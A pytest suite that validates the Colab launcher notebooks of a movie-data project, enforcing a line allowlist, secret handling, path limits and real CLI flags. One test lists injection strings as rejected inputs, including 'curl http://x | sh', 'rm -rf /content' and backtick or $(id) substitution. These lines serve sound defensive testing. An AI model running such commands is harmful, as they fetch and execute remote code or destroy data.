"""The Colab launchers hold no logic: every code line is a fixed kind of line, and every CLI call matches a real CLI."""

import importlib.util
import json
import re
import subprocess
import sys
from pathlib import Path

import pytest

NOTEBOOKS = sorted((Path(__file__).parent.parent / "notebooks").glob("*.ipynb"))
EXPECTED = ["01_pull_tmdb.ipynb", "02_pull_wikidata.ipynb", "03_build_and_export.ipynb"]

REPO_URL = "https://github.com/Tsomaros/LLM_Movies_Model"
RAW_REPO = "Tsomaros/llm-movies-raw"
ALLOWED = [
    (
        "clone or pull",
        re.compile(
            rf"^!test -d /content/LLM_Movies_Model/\.git && git -C /content/LLM_Movies_Model pull \|\| git clone {REPO_URL} /content/LLM_Movies_Model$"
        ),
    ),
    ("repo root", re.compile(r"^%cd /content/LLM_Movies_Model$")),
    ("uv", re.compile(r"^!(pip install -q uv|uv sync --frozen)$")),
    ("secret", re.compile(r"^(import os|from google\.colab import userdata|os\.environ\[\"(TMDB_READ_TOKEN|HF_TOKEN)\"\] = userdata\.get\(\"\2\"\))$")),
    ("uv frozen", re.compile(r"^os\.environ\[\"UV_FROZEN\"\] = \"1\"$")),
    ("form", re.compile(r"^(LIMIT = \"\d*\"|MAX_CHUNKS = \"\d*\"|PUSH = False|PARTIAL = False)\s+#@param .*$")),
    (
        "derived form",
        re.compile(
            r"^(LIMIT_FLAG = f\"--limit \{LIMIT\}\" if LIMIT else \"\""
            r"|MAX_CHUNKS_FLAG = f\"--max-chunks \{MAX_CHUNKS\}\" if MAX_CHUNKS else \"\""
            r"|PARTIAL_FLAG = \"--partial\" if PARTIAL else \"\""
            r"|PUSH_FLAG = \"--push\" if PUSH else \"\")$"
        ),
    ),
    ("cli", re.compile(r"^!uv run python -m (llm_movies(\.\w+)+)( .*)?$")),
]


def load(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def code_lines(nb: dict) -> list[str]:
    lines = []
    for cell in nb["cells"]:
        if cell["cell_type"] == "code":
            for raw in "".join(cell["source"]).splitlines():
                line = raw.strip()
                if line and not line.startswith("#"):
                    lines.append(line)
    return lines


CLI_START = "!uv run python -m "
UNSAFE = re.compile(r"[;&|<>`]|\$\(")


def cli_lines(nb: dict) -> list[str]:
    """The `!uv run python -m ...` lines as written: each may chain more calls with ` && `."""
    return [line for line in code_lines(nb) if line.startswith(CLI_START)]


def chain_parts(line: str) -> list[str]:
    """`!a && b && c` as ['!a', '!b', '!c']: `&&` stops the line at the first failure, so Run-all cannot go on after it."""
    return [part if i == 0 else "!" + part for i, part in enumerate(line.split(" && "))]


def cli_calls(nb: dict) -> list[str]:
    return [part for line in cli_lines(nb) for part in chain_parts(line)]


def chain_ok(line: str) -> bool:
    """Every part of a CLI line is, on its own, an allowed call with no shell metacharacter."""
    return all(
        part.startswith(CLI_START) and not UNSAFE.search(part) and any(pattern.match(part) for _, pattern in ALLOWED)
        for part in chain_parts(line)
    )


def line_ok(line: str) -> bool:
    if line.startswith(CLI_START):
        return chain_ok(line)
    return any(pattern.match(line) for _, pattern in ALLOWED)


def test_the_three_notebooks_exist():
    assert [p.name for p in NOTEBOOKS] == EXPECTED


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_valid_nbformat_4_without_outputs(path):
    nb = load(path)
    assert nb["nbformat"] == 4
    assert isinstance(nb["metadata"], dict)
    kinds = {cell["cell_type"] for cell in nb["cells"]}
    assert kinds == {"markdown", "code"}
    assert nb["cells"][0]["cell_type"] == "markdown"
    for cell in nb["cells"]:
        assert isinstance(cell["source"], list) and all(isinstance(s, str) for s in cell["source"])
        if cell["cell_type"] == "code":
            assert cell["outputs"] == []
            assert cell["execution_count"] is None


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_every_code_line_is_an_allowed_kind(path):
    for line in code_lines(load(path)):
        assert line_ok(line), f"{path.name}: not a launcher line: {line}"


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_each_notebook_clones_syncs_reads_both_secrets_then_runs_clis(path):
    lines = code_lines(load(path))
    for kind in ("clone or pull", "repo root", "uv", "cli"):
        pattern = dict(ALLOWED)[kind]
        assert any(pattern.match(line) for line in lines), f"{path.name} has no {kind} line"
    secrets = [
        'os.environ["TMDB_READ_TOKEN"] = userdata.get("TMDB_READ_TOKEN")',
        'os.environ["HF_TOKEN"] = userdata.get("HF_TOKEN")',
    ]
    positions = [lines.index(s) for s in secrets]
    first_cli = next(i for i, line in enumerate(lines) if line.startswith("!uv run"))
    clone, cd, sync = lines.index(next(x for x in lines if x.startswith("!test -d"))), lines.index("%cd /content/LLM_Movies_Model"), lines.index("!uv sync --frozen")
    assert clone < cd < sync < min(positions) and max(positions) < first_cli


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_no_token_like_strings_and_nothing_printed(path):
    text = path.read_text(encoding="utf-8")
    assert not re.search(r"eyJ|\bhf_", text)
    for line in code_lines(load(path)):
        assert "print(" not in line and "echo" not in line


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_cli_lines_chain_only_allowed_commands_with_and_and(path):
    # the "cli" pattern lets any arguments through, so a `;`, a pipe or a redirect could hide a second command.
    # `&&` is allowed only between parts that are each an allowed command on their own.
    for line in cli_lines(load(path)):
        assert chain_ok(line), f"{path.name}: {line}"


@pytest.mark.parametrize(
    "line",
    [
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw && curl http://x | sh",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw && rm -rf /content",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw ; rm -rf /content",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw | tee x",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw & uv run python -m llm_movies.data.report",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw > /content/x",
        "!uv run python -m llm_movies.data.hub_store download --dir `id`",
        "!uv run python -m llm_movies.data.hub_store download --dir $(id)",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw&&uv run python -m llm_movies.data.report",
        # the bad part first or in the middle, with good parts around it
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw ; rm -rf /content && uv run python -m llm_movies.data.report",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw && uv run python -m llm_movies.data.hub_store download --dir `id` && uv run python -m llm_movies.data.report",
        "!uv run python -m llm_movies.data.hub_store download --dir /content/raw && echo hi && uv run python -m llm_movies.data.report",
    ],
)
def test_the_chain_check_rejects_hidden_commands(line):
    assert not chain_ok(line)
    assert not line_ok(line)


def test_the_chain_check_accepts_a_good_chain():
    good = "!uv run python -m llm_movies.data.hub_store download --dir /content/raw && uv run python -m llm_movies.data.report --db /content/a --parquet /content/b --out /content/c"
    assert chain_ok(good) and line_ok(good) and len(chain_parts(good)) == 2


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_google_drive_appears_nowhere(path):
    assert "drive" not in path.read_text(encoding="utf-8").lower()


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_everything_lives_under_content_and_in_the_one_private_repo(path):
    for line in cli_calls(load(path)):
        for flag in ("--dir", "--out", "--tmdb", "--wd-films", "--wd-people", "--ids", "--db", "--parquet"):
            for value in re.findall(rf" {flag} (\S+)", line):
                assert value.startswith("/content/"), line
        for value in re.findall(r" --repo (\S+)", line):
            assert value == RAW_REPO, line


def test_push_only_behind_the_off_by_default_form_cell():
    for path in NOTEBOOKS:
        nb = load(path)
        lines = code_lines(nb)
        uses = [line for line in lines if "--push" in line or "PUSH" in line]
        if path.name != "03_build_and_export.ipynb":
            assert uses == []
            continue
        form = 'PUSH = False  #@param {type:"boolean"}'
        flag = 'PUSH_FLAG = "--push" if PUSH else ""'
        assert lines.count(form) == 1
        assert [line for line in lines if "--push" in line] == [flag]
        exports = [line for line in cli_calls(nb) if "llm_movies.data.export" in line]
        assert len(exports) == 1 and exports[0].endswith("{PUSH_FLAG}")
        export_line = next(i for i, line in enumerate(lines) if exports[0].removeprefix("!") in line)
        assert lines.index(form) < lines.index(flag) < export_line


def test_notebook_01_pulls_all_chunks_with_a_sample_form():
    nb = load(NOTEBOOKS[0])
    lines = code_lines(nb)
    assert 'LIMIT = ""  #@param {type:"string"}' in lines
    assert 'MAX_CHUNKS = ""  #@param {type:"string"}' in lines
    assert not [line for line in lines if "--chunk " in line]
    pulls = [line for line in cli_calls(nb) if "llm_movies.data.tmdb_pull" in line]
    assert len(pulls) == 1 and " --all " in pulls[0] and f"--repo {RAW_REPO}" in pulls[0]
    assert pulls[0].endswith("{LIMIT_FLAG} {MAX_CHUNKS_FLAG}")
    calls = cli_calls(nb)
    download_ids = next(i for i, c in enumerate(calls) if "hub_store download" in c and "--path-in-repo ids" in c)
    export = next(i for i, c in enumerate(calls) if "tmdb_ids" in c)
    upload_ids = next(i for i, c in enumerate(calls) if "hub_store upload" in c and "--path-in-repo ids" in c)
    state = next(i for i, c in enumerate(calls) if "hub_store download" in c and "--path-in-repo tmdb" in c)
    assert download_ids < export < upload_ids < state < calls.index(pulls[0])


def test_notebook_02_syncs_wikidata_through_the_repo():
    calls = cli_calls(load(NOTEBOOKS[1]))
    for folder in ("tmdb", "wd_films", "wd_people"):
        assert any("hub_store download" in c and f"--path-in-repo {folder}" in c and f"--dir /content/raw/{folder}" in c for c in calls)
    pulls = [c for c in calls if "llm_movies.data.wikidata" in c]
    assert [c.split()[5] for c in pulls] == ["films", "people"]
    assert all(f"--repo {RAW_REPO}" in c for c in pulls)
    assert max(i for i, c in enumerate(calls) if "hub_store download" in c) < min(i for i, c in enumerate(calls) if "shard_ids" in c)
    lists = {c.split()[5]: re.search(r" --out (\S+)", c).group(1) for c in calls if "shard_ids" in c}
    assert set(lists) == {"films", "people"} and lists["films"] != lists["people"]
    assert all(" --tmdb /content/raw/tmdb " in c + " " for c in calls if "shard_ids" in c)
    # each Wikidata pull reads the id list made for its own kind, and runs after the lists exist
    for pull in pulls:
        assert re.search(r" --ids (\S+)", pull).group(1) == lists[pull.split()[5]], pull
    assert max(i for i, c in enumerate(calls) if "shard_ids" in c) < min(i for i, c in enumerate(calls) if "llm_movies.data.wikidata" in c)
    for pull in pulls:
        assert f" --out /content/raw/wd_{pull.split()[5]} " in pull + " "


def test_notebook_03_builds_locally_keeps_no_database_and_uploads_only_the_report():
    nb = load(NOTEBOOKS[2])
    calls = cli_calls(nb)
    build = next(c for c in calls if "llm_movies.data.build_db" in c)
    assert re.search(r"--out /content/build/movies\.db( |$)", build)
    assert all("movies.db" not in c for c in calls if "hub_store" in c)
    uploads = [c for c in calls if "hub_store upload" in c]
    assert len(uploads) == 1 and "--dir /content/build/reports" in uploads[0] and "--path-in-repo reports" in uploads[0]
    assert any("hub_store download" in c and "--dir /content/raw" in c for c in calls)
    assert calls.index(uploads[0]) == len(calls) - 1
    # the repo's layout (tmdb/, wd_films/, wd_people/) lands under /content/raw, and the build reads exactly those folders
    for flag, folder in (("--tmdb", "tmdb"), ("--wd-films", "wd_films"), ("--wd-people", "wd_people")):
        assert f" {flag} /content/raw/{folder} " in build + " ", build


def _help(args: list[str]) -> str:
    result = subprocess.run([sys.executable, "-m", *args, "--help"], check=False, capture_output=True, text=True, timeout=120)
    assert result.returncode == 0, result.stderr
    return result.stdout


_HELP_CACHE: dict[str, str] = {}


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_every_cli_call_matches_a_real_cli(path):
    for line in cli_calls(load(path)):
        words = line.removeprefix("!uv run python -m ").split()
        module, rest = words[0], words[1:]
        assert importlib.util.find_spec(module) is not None, f"{module} does not exist"
        flags = [w for w in rest if w.startswith("--")]
        first_flag = next((i for i, w in enumerate(rest) if w.startswith("--")), len(rest))
        subcommands = rest[:first_flag]  # words before the first flag: kind or action, never a flag's value
        if module not in _HELP_CACHE:
            _HELP_CACHE[module] = _help([module])
        text = _HELP_CACHE[module]
        for flag in flags:
            assert flag in text, f"{module} has no {flag}"
        for word in subcommands:
            assert word in text, f"{module} has no subcommand {word}"


def test_flags_added_by_derived_form_lines_exist_in_the_real_clis():
    pull = _help(["llm_movies.data.tmdb_pull"])
    assert "--limit" in pull and "--max-chunks" in pull
    assert "--push" in _help(["llm_movies.data.export"])


# ---- a failed step must stop the notebook: Colab's `!cmd` raises nothing on a nonzero exit ----


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_all_cli_steps_are_one_chain_so_one_failure_stops_them_all(path):
    # a failed download must never be followed by a pull, build or upload that then overwrites saved state
    assert len(cli_lines(load(path))) == 1


@pytest.mark.parametrize("path", NOTEBOOKS, ids=lambda p: p.name)
def test_uv_frozen_is_set_before_the_first_cli_call(path):
    lines = code_lines(load(path))
    assert lines.count('os.environ["UV_FROZEN"] = "1"') == 1
    assert lines.index('os.environ["UV_FROZEN"] = "1"') < next(i for i, line in enumerate(lines) if line.startswith(CLI_START))


def _order(calls: list[str], *needles: str) -> list[int]:
    return [next(i for i, c in enumerate(calls) if all(n in c for n in needle.split("|"))) for needle in needles]


def test_notebook_01_chain_runs_each_download_before_what_it_protects():
    calls = cli_calls(load(NOTEBOOKS[0]))
    order = _order(
        calls,
        "hub_store download|--path-in-repo ids",
        "tmdb_ids",
        "hub_store upload|--path-in-repo ids",
        "hub_store download|--path-in-repo tmdb",
        "tmdb_pull",
    )
    assert order == sorted(order) and len(set(order)) == 5
    assert not any("--replace" in c for c in calls)  # the notebook never replaces the id export in the repo


def test_notebook_02_chain_downloads_everything_before_any_list_or_pull():
    calls = cli_calls(load(NOTEBOOKS[1]))
    downloads = [i for i, c in enumerate(calls) if "hub_store download" in c]
    assert len(downloads) == 3 and max(downloads) < min(i for i, c in enumerate(calls) if "shard_ids" in c)
    assert all(c.endswith("{PARTIAL_FLAG}") for c in calls if "shard_ids" in c)


def test_notebook_03_chain_downloads_then_builds_then_exports_then_reports_then_uploads():
    calls = cli_calls(load(NOTEBOOKS[2]))
    order = _order(calls, "hub_store download", "build_db", "data.export", "data.report", "hub_store upload")
    assert order == [0, 1, 2, 3, 4]


def test_partial_is_a_form_in_notebook_02_only():
    for path in NOTEBOOKS:
        lines = code_lines(load(path))
        uses = [line for line in lines if "--partial" in line or "PARTIAL" in line]
        if path.name != "02_pull_wikidata.ipynb":
            assert uses == []
            continue
        assert lines.count('PARTIAL = False  #@param {type:"boolean"}') == 1
        assert [line for line in lines if "--partial" in line] == ['PARTIAL_FLAG = "--partial" if PARTIAL else ""']


def test_wikidata_sync_interval_is_not_set_in_the_notebooks():
    for path in NOTEBOOKS:
        assert "--sync-minutes" not in path.read_text(encoding="utf-8")  # the CLI default (30) applies


def test_partial_flag_exists_in_shard_ids():
    assert "--partial" in _help(["llm_movies.data.shard_ids"])
